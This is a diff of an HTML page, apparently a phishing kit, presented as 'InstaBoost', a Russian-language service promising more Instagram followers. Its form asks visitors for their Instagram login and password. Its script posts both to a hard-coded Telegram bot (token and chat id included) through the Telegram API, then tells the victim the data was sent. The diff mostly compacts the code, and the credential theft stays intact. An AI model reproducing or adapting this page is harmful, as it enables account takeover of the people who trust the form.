@@ -3,145 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MyChat xoshimzoda</title>
+    <title>InstaBoost</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { 
-            margin: 0; 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            background: linear-gradient(135deg, #2b0a3d, #3a0ca3, #720026); 
-            font-family: -apple-system, sans-serif; 
-        }
-
-        .container { 
-            width: 320px; 
-            background: rgba(255,255,255,0.05); 
-            backdrop-filter: blur(15px); 
-            border-radius: 25px; 
-            display: flex; 
-            flex-direction: column; 
-            padding: 25px 20px 20px 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5); 
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .social-icons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 15px;
-            font-size: 24px;
-            color: rgba(255,255,255,0.7);
-        }
-
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #2b0a3d, #3a0ca3, #720026); font-family: -apple-system, sans-serif; }
+        .container { width: 320px; background: rgba(255,255,255,0.05); backdrop-filter: blur(15px); border-radius: 25px; display: flex; flex-direction: column; padding: 25px 20px 20px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }
+        .social-icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 15px; font-size: 24px; color: rgba(255,255,255,0.7); }
         .social-icons i { transition: 0.3s; }
         .social-icons i:active { color: white; transform: scale(1.1); }
-
-        .header { 
-            text-align: center; 
-            color: white; 
-            font-weight: bold; 
-            margin-bottom: 20px;
-            font-size: 1.2em;
-        }
-
+        .header { text-align: center; color: white; font-weight: bold; margin-bottom: 20px; font-size: 1.2em; }
         .input-group { display: flex; flex-direction: column; gap: 12px; }
-
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            border-radius: 15px; 
-            border: none; 
-            background: rgba(255,255,255,0.9); 
-            box-sizing: border-box; 
-            font-size: 16px;
-            outline: none;
-        }
-
-        .btn-send { 
-            margin-top: 15px;
-            padding: 15px; 
-            border: none; 
-            border-radius: 15px; 
-            background: #ff006e; 
-            color: white; 
-            cursor: pointer; 
-            font-weight: bold; 
-            font-size: 16px;
-            transition: 0.3s;
-        }
-
+        input { width: 100%; padding: 14px; border-radius: 15px; border: none; background: rgba(255,255,255,0.9); box-sizing: border-box; font-size: 16px; outline: none; }
+        .btn-send { margin-top: 15px; padding: 15px; border: none; border-radius: 15px; background: #ff006e; color: white; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
         .btn-send:active { transform: scale(0.96); background: #d9005d; }
     </style>
 </head>
 <body>
-
 <div class="container">
     <div class="social-icons">
         <i class="fab fa-telegram"></i>
         <i class="fab fa-instagram"></i>
         <i class="fab fa-whatsapp"></i>
     </div>
-
-    <div class="header">Instagram для охват подписчиков👥</div>
-    
+    <div class="header">Instagram для охвата подписчиков👥</div>
     <div class="input-group">
         <input type="text" id="username" placeholder="Твой логин">
         <input type="text" id="message" placeholder="Пароль">
         <button class="btn-send" onclick="sendMessage()">Отправить</button>
     </div>
 </div>
-
 <script>
     const sendSound = new Audio('https://www.soundjay.com/buttons/sounds/button-37a.mp3');
-
     async function sendMessage() {
-        // Твои данные полностью исправлены здесь:
+        // Данные БЕЗ ПРОБЕЛОВ
         const botToken = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKf02e3wNBxn4";
         const chatId = "7829181579";
-
-        let userField = document.getElementById("username");
-        let msgField = document.getElementById("message");
-        
-        let username = userField.value;
-        let message = msgField.value;
-
-        if (!username || !message) {
-            alert("Заполни логин и пароль!");
-            return;
-        }
-
-        sendSound.play(); 
-
-        const time = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
-        const text = `<b>📩 Новое сообщение!</b>\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${message}\n⏰ <b>Время:</b> ${time}`;
-
+        let uF = document.getElementById("username");
+        let mF = document.getElementById("message");
+        let u = uF.value;
+        let m = mF.value;
+        if (!u || !m) { alert("Заполни логин и пароль!"); return; }
+        sendSound.play();
+        const t = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
+        const text = `<b>📩 Новое сообщение!</b>\n👤 <b>Логин:</b> ${u}\n🔑 <b>Пароль:</b> ${m}\n⏰ <b>Время:</b> ${t}`;
         try {
-            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: "HTML"
-                })
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "HTML" })
             });
-
-            if (response.ok) {
+            if (r.ok) {
                 alert("Данные отправлены!");
-                msgField.value = "";
-                userField.value = "";
+                mF.value = ""; uF.value = "";
             } else {
-                alert("Ошибка бота. Проверь, нажал ли ты СТАРТ в Telegram.");
+                alert("Ошибка бота. Нажми СТАРТ в Telegram!");
             }
         } catch (e) {
-            alert("Ошибка сети. Проверь интернет.");
+            alert("Ошибка сети.");
         }
     }
 </script>
-
 </body>
 </html>
